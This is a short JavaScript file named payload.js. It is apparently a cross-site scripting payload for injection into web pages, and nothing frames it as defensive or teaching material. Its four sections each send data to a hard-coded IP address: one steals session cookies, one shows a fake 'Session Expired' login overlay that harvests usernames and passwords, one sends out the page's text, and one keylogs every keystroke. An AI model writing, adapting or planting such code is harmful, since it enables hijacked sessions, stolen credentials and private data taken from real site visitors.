// payload.js

// 1. Cookie Stealing
new Image().src = "https://185.196.11.208:8000/log?cookie=" + encodeURIComponent(document.cookie);

// 2. Fake Login Form (Phishing)
let fake = document.createElement('div');
fake.innerHTML = `<div style="position:fixed;top:30%;left:30%;background:white;padding:30px;box-shadow:0 0 10px black;z-index:9999">
<h3>Session Expired</h3>
<p>Please re-enter your credentials</p>
<input name="username" placeholder="Username"><br><input name="password" placeholder="Password" type="password"><br><button onclick="steal()">Login</button>
</div>`;
document.body.appendChild(fake);

function steal() {
  let u = document.querySelector('input[name="username"]').value;
  let p = document.querySelector('input[name="password"]').value;
  fetch("https://185.196.11.208:8000/log", {
    method: "POST",
    body: "username=" + encodeURIComponent(u) + "&password=" + encodeURIComponent(p),
    headers: {"Content-Type":"application/x-www-form-urlencoded"}
  });
}

// 3. Exfiltrate Page Content
let data = document.body.innerText;
fetch("https://185.196.11.208:8000/log", {
  method: "POST",
  body: "content=" + encodeURIComponent(data),
  headers: {"Content-Type":"application/x-www-form-urlencoded"}
});

// 4. Keylogger
document.addEventListener("keydown", function(e){
  fetch("https://185.196.11.208:8000/log?key=" + encodeURIComponent(e.key));
});
